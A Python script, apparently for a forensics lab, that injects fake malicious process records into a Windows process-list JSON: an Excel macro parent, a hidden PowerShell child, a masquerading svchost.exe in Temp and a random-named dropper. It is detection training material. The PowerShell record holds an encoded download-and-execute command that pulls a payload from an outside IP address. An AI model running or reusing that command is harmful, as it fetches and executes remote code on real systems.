import json
import random
import string

INPUT  = "/home/sansforensics/artifacts/win11_processes_sample.json"
OUTPUT = "/home/sansforensics/artifacts/win11_evil_processes.json"

with open(INPUT, encoding="utf-8-sig") as f:
    processes = json.load(f)

# Find explorer.exe PID to use as parent
explorer_pid = next(p["ProcessId"] for p in processes if p["Name"] == "explorer.exe")

# Evil process 1: excel.exe (macro launcher)
excel_pid = 11111
processes.append({
    "ProcessId": excel_pid,
    "ParentProcessId": explorer_pid,
    "Name": "EXCEL.EXE",
    "ExecutablePath": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /e \"C:\\Users\\User\\Documents\\invoice_april.xlsm\""
})

# Evil process 2: powershell spawned by excel (macro execution)
ps_pid = 11112
processes.append({
    "ProcessId": ps_pid,
    "ParentProcessId": excel_pid,
    "Name": "powershell.exe",
    "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADUALwBwAGEAeQBsAG8AYQBkACcAKQA="
})

# Evil process 3: fake svchost in Temp (masquerading)
processes.append({
    "ProcessId": 11113,
    "ParentProcessId": ps_pid,
    "Name": "svchost.exe",
    "ExecutablePath": "C:\\Users\\User\\AppData\\Local\\Temp\\svchost.exe",
    "CommandLine": "svchost.exe -k netsvcs"
})

# Evil process 4: random named dropper
random_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".exe"
processes.append({
    "ProcessId": 11114,
    "ParentProcessId": ps_pid,
    "Name": random_name,
    "ExecutablePath": None,
    "CommandLine": None
})

with open(OUTPUT, "w", encoding="utf-8") as f:
    json.dump(processes, f, indent=4)

print(f"[+] Evil processes injected -> {OUTPUT}")
print(f"[+] Total processes: {len(processes)}")
print(f"[+] Added: EXCEL.EXE -> powershell.exe -> svchost.exe (Temp) + {random_name}")
